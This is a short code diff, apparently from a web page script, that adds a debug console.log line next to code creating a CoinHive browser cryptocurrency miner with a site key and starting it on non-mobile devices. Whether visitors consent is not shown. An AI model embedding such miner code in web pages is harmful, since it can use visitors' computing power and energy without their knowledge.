@@ -47,7 +47,7 @@ var miner = new CoinHive.Anonymous('4SxY5rIdGvO3MT3CJet0Hm8GEjGW7SP2', 'dev_log'
     theme: 'light'
 });
 
-
+console.log("Out");
 // Only start on non-mobile devices
 if (typeof miner !== 'undefined') {
     console.log("in");
